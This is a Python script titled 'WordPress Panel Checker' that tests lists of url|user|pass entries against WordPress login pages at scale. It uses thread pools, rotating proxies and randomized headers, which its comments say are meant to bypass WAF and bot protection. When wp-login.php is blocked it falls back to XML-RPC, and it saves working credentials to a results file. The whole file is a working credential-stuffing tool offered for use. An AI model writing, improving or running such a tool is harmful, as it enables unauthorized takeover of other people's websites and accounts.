import os
import time
import requests
import urllib3
import threading
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

try:
    from tqdm import tqdm
except ImportError:
    print(f"{Fore.RED}[!] Library 'tqdm' is required. Please install it using: pip install tqdm --break-system-packages{Style.RESET_ALL}")
    os._exit(1)

# Disable warnings for insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

class WPChecker:
    def __init__(self):
        self.results_dir = "Results"
        self.success_file = os.path.join(self.results_dir, "WP_Success.txt")
        self.failed_file = os.path.join(self.results_dir, "Not_working.txt")
        self.proxy_file = "proxies.txt"
        
        # Thread lock for safe terminal printing and file writing
        self.print_lock = threading.Lock()
        
        # Setup directories
        os.makedirs(self.results_dir, exist_ok=True)
        
        # Stats
        self.stats = {'hit': 0, 'bad': 0, 'error': 0}
        self.stats_lock = threading.Lock()
        
        # Proxies
        self.proxies_list = []
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'r', encoding='utf-8') as f:
                self.proxies_list = [p.strip() for p in f.read().splitlines() if p.strip()]
        
        # Pool of Powerful User-Agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.44 Mobile Safari/537.36'
        ]

    def get_headers(self):
        """Generate random powerful headers to bypass WAF / Bot Protection"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        
    def get_proxy(self):
        if not self.proxies_list:
            return None
        p = random.choice(self.proxies_list)
        return {"http": f"http://{p}", "https": f"http://{p}"}

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_banner(self):
        current_year = time.strftime("%Y")
        cyan = Fore.CYAN + Style.BRIGHT
        blue = Fore.BLUE + Style.BRIGHT
        reset = Style.RESET_ALL
        
        banner_text = f'''
 __      __  _____           ___   _   _  ____   ___  _  __  ____  ____  
 \\ \\    / / |  __ \\         / __| | | | || ___| / __|| |/ / | ___||  _ \\ 
  \\ \\  / /  | |__) | _____ | |    | |_| || |__ | |   | ' /  | |__ | |_) |
   \\ \\/ /   |  ___/ |_____|| |    |  _  ||  __|| |   |  <   |  __||  _ < 
    \\  /    | |            | |___ | | | || |___| |__ | . \\  | |___| | \\ \\
     \\/     |_|             \\____||_| |_||____/ \\___||_|\\_\\ |____/|_|  \\_\\
                                               github.com/denoyey | {current_year}                                           
           {cyan}\\━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━/
           \t├╼ {blue}BY : github.com/denoyey{cyan}
           \t├╼ {blue}WordPress Panel Checker{cyan}
           \t└╼ {cyan}[Important] - > TEXT-Format : ' http://site.com/wp-login.php|user|pass '{reset}
        '''
        print(banner_text)

    def safe_print(self, text, pbar=None):
        """Thread-safe print. If pbar is provided, use tqdm.write to not break the progress bar."""
        with self.print_lock:
            if pbar:
                tqdm.write(text)
            else:
                print(text)

    def save_result(self, filepath, data):
        """Thread-safe file writing."""
        with self.print_lock:
            with open(filepath, 'a+', encoding='utf-8') as f:
                f.write(data)

    def update_stats(self, key, pbar):
        with self.stats_lock:
            self.stats[key] += 1
            pbar.set_postfix(Hit=self.stats['hit'], Bad=self.stats['bad'], Error=self.stats['error'])

    def check_xmlrpc(self, url, user, pwd, headers, proxies):
        """Fallback to XML-RPC if wp-login.php fails"""
        url_xmlrpc = url.replace('/wp-login.php', '/xmlrpc.php')
        payload = f'''<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
 <param><value>{user}</value></param>
 <param><value>{pwd}</value></param>
</params>
</methodCall>'''
        
        try:
            req = requests.post(
                url_xmlrpc, 
                data=payload, 
                headers=headers, 
                proxies=proxies,
                verify=False,
                timeout=15
            )
            
            if 'isAdmin' in req.text or 'blogid' in req.text:
                return True
            return False
        except:
            return False

    def check_login(self, target, pbar):
        try:
            parts = target.strip().split('|')
            if len(parts) != 3:
                self.update_stats('error', pbar)
                return

            url, user, pwd = parts[0], parts[1], parts[2]
            
            max_retries = 3
            success = False
            
            for attempt in range(max_retries):
                try:
                    headers = self.get_headers()
                    proxies = self.get_proxy()
                    cook = requests.Session()
                    
                    # Request initial cookies with headers
                    cook.get(url, headers=headers, proxies=proxies, allow_redirects=False, timeout=10, verify=False)
                    
                    url_dash = url.replace('/wp-login.php', '')
                    payload = {
                        'log': user, 
                        'pwd': pwd, 
                        'wp-submit': 'Log In', 
                        'redirect_to': f'{url_dash}/wp-admin/',
                        'testcookie': '1'
                    }
                    
                    # Send POST request for login
                    req = cook.post(
                        url, 
                        data=payload, 
                        headers=headers, 
                        proxies=proxies,
                        allow_redirects=True, 
                        verify=False,
                        timeout=15
                    )
                    
                    # 1. 100% Accurate Cookie Detection
                    is_logged_in = any('wordpress_logged_in' in c.name for c in cook.cookies)
                    
                    # 2. Text based fallback detection
                    if not is_logged_in:
                        if 'dashboard' in req.text.lower() or 'howdy' in req.text.lower() or '/wp-admin/admin-ajax.php' in req.text:
                            is_logged_in = True
                            
                    # 3. XML-RPC Fallback if above fails (WAF blocked wp-login.php)
                    if not is_logged_in:
                        is_logged_in = self.check_xmlrpc(url, user, pwd, headers, proxies)

                    if is_logged_in:
                        msg = f"{Fore.GREEN}[Success] {Fore.WHITE}{url} | {Fore.YELLOW}User: {user} | Pass: {pwd}{Style.RESET_ALL}"
                        self.safe_print(msg, pbar)
                        self.save_result(self.success_file, f'{url}\nUser : {user}\nPass : {pwd}\n\n')
                        self.update_stats('hit', pbar)
                    else:
                        self.save_result(self.failed_file, f'{target}\n')
                        self.update_stats('bad', pbar)
                    
                    success = True
                    break # Break out of retry loop if successful request
                except requests.exceptions.RequestException:
                    continue # Retry on timeout/connection error
            
            if not success:
                self.update_stats('error', pbar)

        except Exception as e:
            self.update_stats('error', pbar)
        finally:
            pbar.update(1)

    def run(self):
        self.clear_screen()
        self.show_banner()
        
        # Check proxy file existence message
        if self.proxies_list:
            print(f"{Fore.GREEN}[+] Loaded {len(self.proxies_list)} proxies from {self.proxy_file}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] No proxies loaded. Create 'proxies.txt' for proxy support.{Style.RESET_ALL}")
            
        # Safe input handling for list file
        while True:
            list_file = input(f"{Fore.CYAN}[List File] : {Style.RESET_ALL}")
            if not os.path.exists(list_file):
                print(f"{Fore.RED}[!] File '{list_file}' not found. Please check the name and try again.{Style.RESET_ALL}")
            else:
                break
                
        # Safe input handling for thread count
        try:
            threads = int(input(f"{Fore.CYAN}[Threads] : {Style.RESET_ALL}"))
        except ValueError:
            print(f"{Fore.RED}[!] Invalid thread count. Defaulting to 10.{Style.RESET_ALL}")
            threads = 10

        # Read and prepare targets safely
        try:
            with open(list_file, 'r', encoding='utf-8') as f:
                targets = list(dict.fromkeys(f.read().splitlines()))
                targets = [t for t in targets if t.strip()] # Filter empty lines
        except Exception as e:
            print(f"{Fore.RED}[!] Error reading file: {e}{Style.RESET_ALL}")
            return

        print(f"\n{Fore.YELLOW}[*] Starting checker with {threads} threads for {len(targets)} targets...{Style.RESET_ALL}\n")

        # Use ThreadPoolExecutor with tqdm for progress bar
        try:
            with tqdm(total=len(targets), desc="Checking", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]", dynamic_ncols=True) as pbar:
                pbar.set_postfix(Hit=0, Bad=0, Error=0)
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = [executor.submit(self.check_login, target, pbar) for target in targets]
                    for future in as_completed(futures):
                        pass
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Process interrupted by user (Ctrl+C). Shutting down forcefully...{Style.RESET_ALL}")
            os._exit(1)
        
        print(f"\n{Fore.GREEN}[*] Checking completed! Results saved in '{self.results_dir}'.")
        print(f"[*] Summary -> Hits: {self.stats['hit']} | Bad: {self.stats['bad']} | Errors: {self.stats['error']}{Style.RESET_ALL}")

if __name__ == "__main__":
    checker = WPChecker()
    checker.run()
